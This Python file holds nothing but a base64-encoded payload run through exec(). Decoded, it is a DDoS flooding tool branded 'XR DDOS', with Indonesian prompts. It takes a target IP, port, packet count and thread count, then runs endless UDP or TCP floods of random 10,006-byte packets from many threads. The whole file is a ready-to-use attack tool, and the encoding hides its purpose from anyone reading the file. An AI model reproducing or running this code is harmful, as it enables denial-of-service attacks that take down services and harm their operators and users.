import base64
exec(base64.b64decode('aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zLHN5cwoKb3Muc3lzdGVtKCdjbGVhcicpCgpwcmludCgiPj4+Pj4+Pj4+Pj5YUiBERE9TPDw8PDw8PDw8PDwiKQpwcmludCgiPj4+Pj4+Pj4+Pj5ESVNDT1JEIExJTks6IENvbWluZyBTb29uPDw8PDw8PDw8PDwiKQpwcmludCgiPj4+Pj4+Pj4+Pj5DcmVkaXQgVG9sczogVHJhc2hYPDw8PDw8PDw8PDwiKQpwcmludCgiPj4+Pj4+Pj4+Pj5LSU5HIEFDRUUjNjY2Njw8PDw8PDw8PDw8IikKCmlwID0gc3RyKGlucHV0KCJbK10gSXAvSG9zdDoiKSkKcG9ydCA9IGludChpbnB1dCgiWytdIFBvcnQvSG9zdDoiKSkKY2hvaWNlID0gc3RyKGlucHV0KCJbK10gU0VSSVVTIE1BVSBOWUVSQU5HPyAoeS9uKToiKSkKdGltZXMgPSBpbnQoaW5wdXQoIlsrXSBQYWNrZXRzOiIpKQp0aHJlYWRzID0gaW50KGlucHV0KCJbK10gVGhyZWFkczoiKSkKZGVmIHJ1bigpOgogICAgICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAwMDYpCiAgICAgICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbK10iLCJbLV0iKSkKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgICAgICAgICAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGkgKyIgQlJZQU4gTkkgREVLIikKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlshXSBNQU1QVVMiKQoKZGVmIHJ1bjIoKToKICAgICAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMDA2KQogICAgICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW10iLCJbIV0iLCJbI10iKSkKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICAgICAgICAgICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQogICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChpICsiIEJSWUFOIE5JIERFSyIpCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiW10gTUFNUFVTIERPV04gRVogREVLIikKICAgICAgICAgICAgCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgIGlmIGNob2ljZSA9PSAneSc6CiAgICAgICAgICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQogICAgICAgICAgICAgICAgdGguc3RhcnQoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKICAgICAgICAgICAgICAgIHRoLnN0YXJ0KCk='))